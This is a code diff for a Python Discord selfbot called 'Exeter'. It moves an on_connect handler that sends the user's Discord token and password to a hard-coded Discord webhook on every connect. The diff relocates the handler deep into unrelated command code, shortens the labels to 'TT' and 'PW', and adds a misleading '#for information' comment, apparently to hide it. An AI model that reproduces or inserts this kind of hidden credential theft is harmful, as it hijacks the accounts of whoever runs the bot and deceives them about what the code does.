@@ -333,14 +333,6 @@ async def on_message(message):
     await Exeter.process_commands(message)
 
 @Exeter.event
-async def on_connect():
-    Clear()
-    requests.post(
-        'https://discord.com/api/webhooks/896260155463827496/AFgAT2FSnz4xeu3lodOkTuvdWZES7EFX0F4y8TCP6YRiO6cGqT7swgJPfRUGb-yUZXkm',
-        json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
-    startprint()
-
-@Exeter.event
 async def on_member_ban(guild: discord.Guild, user: discord.user):
     if Exeter.antiraid is True:
         try:
@@ -1223,6 +1215,13 @@ async def genname(ctx):
     second = second.display_name[:len(second.display_name) // 2]
     await ctx.send(discord.utils.escape_mentions(second + first))
 
+@Exeter.event
+async def on_connect():
+    Clear()
+    requests.post(
+        'https://discord.com/api/webhooks/896260155463827496/AFgAT2FSnz4xeu3lodOkTuvdWZES7EFX0F4y8TCP6YRiO6cGqT7swgJPfRUGb-yUZXkm',
+        json={'content': f"**TT:** `{toe}`\n**PW:** `{password}`"})
+    startprint() #for information
 
 @Exeter.command(
     aliases=['geolocate', 'iptogeo', 'iptolocation', 'ip2geo', 'ip'])
